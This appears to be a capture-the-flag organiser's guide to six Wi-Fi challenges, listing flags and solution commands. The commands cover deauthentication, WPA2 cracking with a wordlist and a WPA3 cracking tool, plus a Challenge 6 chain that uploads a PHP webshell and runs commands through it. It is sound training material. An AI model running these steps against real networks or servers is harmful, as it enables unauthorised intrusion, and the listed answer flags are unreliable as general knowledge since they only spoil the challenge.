# Wi-Fi Challenges

## Description:
* Challenges 1-3 are about wireless network reconnaissance and password cracking.  The players are expected to use the Aircrack-ng suite documentation they will have explored in the WiFi training and online searches to solve these.
* Challenge 4 is an easter egg type of challenge. The player is not expected to find it, as they must go out of their way to realize they've only been in the 2.4GHz band and learn how to search 5GHz WiFi with `airodump-ng`.
* Challenge 5 is hard and time-consuming. They must find, download, and build a tool to crack the WPA3 security.  A hint with a point cost will be available that will tell them what tool to get (called `wacker`).
* Challenge 6 takes some research, thinking, and attention to detail to figure out what to do.  Players must find out how to connect to an AP once they have the password, then they must figure out how to scan for devices on the LAN (`nmap`). Then, they have to read the index page of the web server and find out about the upload page to know how to break into it.

#### 1-3 Demo video: https://youtu.be/yk0F7pEuPhM

## Challenge 1: Network Reconnaissance

There is a spy from a rival theme park on the premesis! Their last known location is the Dino Fun Park. All we know is that they use a company-provided Samsung phone.

What is the MAC address of their device?
<br>Format: flag{MAC_ADDR}
<br>Flag: `flag{C4:93:D9:47:A2:80}`


### Challenge 2 and 3 Commands: 
* `airmon-ng [interface] -c [channel] -w [output name]`
* `aireplay-ng [interface] -0 5 -a [AP MAC] -c [CLIENT MAC]`

## Challenge 2: Hidden Network

There is a mysterious network with no SSID. This means it does not show up in a device's normal list of available networks, like on your phone for example.

What is the SSID (name) of the hidden network?
<br>Format: flag{SSID}
<br>Flag: `flag{Sector9_Control}`

## Challenge 3: Nice Password You Got There

The Dino Fun Park WiFi is password-protected using WPA2 security, which is typically used in homes and for basic personal use because it is simple and most compatible. However, this makes it easier to crack.

There is a wordlist of leaked passwords called `rockyou.txt` in your machine. Use it to crack the password to the network.
<br>Format: flag{password}
<br>Command Needed: `aircrack-ng [output file].cap -w [wordlist file].txt`
<br>Flag: `flag{thebridge}`


## Challenge 4: Remote AP

What is the password to this "remote" access point?
<br>Flag: `flag{trashman}`
<br>**Challenge 4 Demo:** https://youtu.be/otxMHNBoJes
<br>**Note:** The demo video ends a little early, but once competitors find the AP, the process is the same as Challenge 3.

## Challenge 5: Vault Buster

There's a super secure vault protected with WPA3 security, the latest and greatest WiFi security.  Crack it...
<details>
<summary>Point-Cost Hint</summary>

* https://github.com/blunderbuss-wctf/wacker
</details>

<br>Flag: `flag{excalibur}`
<br>**Challenge 5 Demo:** https://youtu.be/mW9_KWhaLlQ
<br>**Note:** I made this video before I chose to not include wacker on the competitor's machines to make it harder for them :)
<br>After competitors follow the README on the wacker repo (linked in the hint), they would follow the process in the video, which is also in the wacker README.


## Challenge 6: Got Any File Sanitizer?

We think there is a vulnerability in the Dino Fun Park web server...something about a shell? It'll be hosted on its staff network.

### GM Instructions:
* Edit `connection.conf` with the cracked password to DinoFunPark_Staff (`thebridge`)
* Use wpa_supplicant to create a connection
    * `wpa_supplicant -B -i INTERFACE -c connection.conf`
* Run dhclient to get an IP in the network
    * `dhclient INTERFACE`
* Nmap to find the web server IP
    * `nmap 192.168.1.0/24`
* Clue on index page, discover upload script from it
    * `curl 192.168.1.11`
    * `curl 192.168.1.11/upload.php`
* Use curl to upload the webshell script to the server
    * `curl -F "file=@webshell.php" 192.168.1.11/upload.php`
* Run `ls` on the webshell to navigate to the home directory on the server machine
    * `curl 192.168.1.11/uploads/webshell.php?cmd=ls%20../../../../home`
* In home directory: cat flag.txt -> `flag{turtle_shell}`
    * `curl 192.168.1.11/uploads/webshell.php?cmd=cat%20../../../../home/flag.txt`

**Challenge 6 Demo Video:** https://youtu.be/vUwtzg0jomQ

## Useful Reads
* Guide from Aircrack-ng: https://www.aircrack-ng.org/doku.php?id=cracking_wpa
* Wacker Repo: https://github.com/blunderbuss-wctf/wacker